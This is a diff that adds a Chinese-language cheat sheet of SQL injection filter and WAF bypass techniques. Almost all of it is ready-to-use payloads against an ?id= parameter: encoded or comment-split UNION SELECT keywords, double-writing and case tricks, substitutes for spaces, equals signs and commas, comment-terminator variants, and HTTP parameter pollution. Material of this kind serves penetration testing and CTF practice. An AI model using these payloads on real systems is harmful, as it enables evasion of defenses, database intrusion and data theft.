@@ -1,0 +1,75 @@
+# SQL 注入绕过技巧
+
+## 空格过滤
+```sql
++ 绕过：%09 %0a %0c %0d %20 %a0 /**/
+?id=1%0aunion%0aselect%0a1,2,3
+?id=1/**/union/**/select/**/1,2,3
+```
+
+## 关键字过滤
+```sql
+# 双写绕过
+?id=1 uniunionon selselectect 1,2,3
+
+# 大小写绕过
+?id=1 UnIoN SeLeCt 1,2,3
+
+# 注释分割
+?id=1 uni/**/on sel/**/ect 1,2,3
+
+# 编码绕过
+?id=1 /*!union*/ /*!select*/ 1,2,3
+?id=1 %75%6e%69%6f%6e%20%73%65%6c%65%63%74 1,2,3
+```
+
+## 等于号过滤
+```sql
+?id=1 and ascii(mid(user(),1,1))>1    # 大于小于
+?id=1 and (substr(user(),1,1)= 'a')   # 括号字符比对
+?id=1 and user() like 'r%'            # like
+?id=1 and user() regexp '^r'          # 正则
+?id=1 and user() between 'a' and 'z'  # between
+```
+
+## 逗号过滤
+```sql
+# limit 替代
+select * from user limit 1 offset 1
+
+# substring 绕过
+select * from user where id=1 and substr(user() from 1 for 1)='r'
+
+# union 绕过
+?id=1 union select * from (select 1)a join (select 2)b join (select 3)c
+```
+
+## 注释符过滤
+```sql
+# 使用 --+ 或 # 被过滤
+?id=1 union select 1,2,3-- -
+?id=1 union select 1,2,3%23
+?id=1 union select 1,2,3;%00
+```
+
+## 函数替代
+```sql
+# substr → substring / mid
+# ord → ascii
+# @@datadir → @@tmpdir
+# information_schema → sys.schema_auto_increment_columns
+```
+
+## WAF 绕过
+```sql
+# 参数污染（多个同名参数）
+?id=1&id=2&id=3+union+select+...
+?id[]=1&id[]=2+union+select+...
+
+# HTTP 参数污染（HPP）
+?id=1+union+/*&id=*/select+1,2,3
+
+# 请求方式绕过
+GET → POST
+POST → application/json
+```
